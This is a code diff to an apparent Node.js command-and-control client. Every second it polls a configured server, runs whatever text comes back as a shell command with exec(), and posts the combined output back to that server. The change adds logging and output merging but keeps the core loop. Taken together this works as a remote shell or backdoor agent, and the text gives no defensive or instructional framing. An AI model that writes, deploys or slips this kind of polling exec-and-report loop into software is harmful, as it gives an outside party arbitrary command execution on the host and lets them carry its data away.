@@ -14,23 +14,27 @@ setInterval(function () {
     followRedirect: true,
     maxRedirects: 3
   }, function (error, response, body) {
-    if (!error)
-      exec(body, output);
+    if (!error) {
+      if (body != '') {
+        console.log('Command:' + body);
+        exec(body, function (error, stdout, stderr) {
+          if (error) output(stderr);
+          else output(stderr + stdout);
+        });
+      }
+    } else {
+      console.log(error);
+    }
   });
 }, 1000);
 
-function output(error, stdout, stderr) {
-  request.post('http://' + config.serverLocation + ':' + config.serverPort + '/postExecute/'
-      , {
-        'id': config.clientId,
-        'error': error,
-        'stdout': stdout,
-        'stderr': stderr
-      },
+function output(output) {
+  console.log('Output:'+output);
+  request.post({ url: 'http://' + config.serverLocation + ':' + config.serverPort + '/postExecute',
+        form: { id: config.clientId, output: output}},
       function (error, response, body) {
-        if (error || response.statusCode != 200)
-        {
-          console.log('Error in sending post.');
+        if (error || response.statusCode != 200) {
+          console.log('Error in sending command output.');
         }
       });
 }
